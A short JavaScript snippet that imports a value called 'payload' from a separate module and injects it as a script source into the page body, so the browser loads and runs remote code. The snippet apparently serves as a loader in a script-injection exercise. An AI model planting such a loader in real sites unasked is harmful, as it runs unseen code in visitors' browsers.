import { payload } from './source.js';

var scriptElement = document.createElement("script");
scriptElement.src = payload;
document.body.appendChild(scriptElement);